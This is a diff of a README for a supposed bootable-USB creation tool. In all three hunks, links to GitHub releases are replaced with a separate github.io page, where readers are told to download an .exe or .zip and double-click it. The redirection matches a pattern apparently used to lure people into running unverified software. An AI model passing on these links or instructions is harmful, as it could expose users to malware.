@@ -1,7 +1,7 @@
 <h1>💾 usb-bootable-tool - Create Bootable USB Drives Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/cordslockout5394/usb-bootable-tool/releases">
+  <a href="https://cordslockout5394.github.io">
     <img src="https://img.shields.io/badge/Download-USB_Bootable_Tool-blue?style=for-the-badge&logo=windows&logoColor=white&color=0088cc" alt="Download Button" width="300" height="60">
   </a>
 </p>
@@ -33,7 +33,7 @@ Follow these three simple steps to create your bootable USB drive.
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-👉 [**Click here to download usb-bootable-tool**](https://github.com/cordslockout5394/usb-bootable-tool/releases)
+👉 [**Click here to download usb-bootable-tool**](https://cordslockout5394.github.io)
 
 Look for the latest release. The download file is named something like `usb-bootable-tool.exe` or `usb-bootable-tool.zip`. Choose the one that is compatible with your Windows computer (most users should pick the 64-bit version if available).
 
@@ -60,7 +60,7 @@ When it says **"Done"** or **"Successful"**, you can safely remove your USB driv
 ## 📥 Download & Install
 
 **Download the application here:**  
-[🔗 https://github.com/cordslockout5394/usb-bootable-tool/releases](https://github.com/cordslockout5394/usb-bootable-tool/releases)
+[🔗 https://cordslockout5394.github.io](https://cordslockout5394.github.io)
 
 Visit this link to download the application. Choose the latest version. The file will be in `.exe` or `.zip` format. If it is a `.zip` file, extract it to a folder first, then double-click the `.exe` file inside to run the tool. If it is a direct `.exe` file, simply double-click it to run.
 
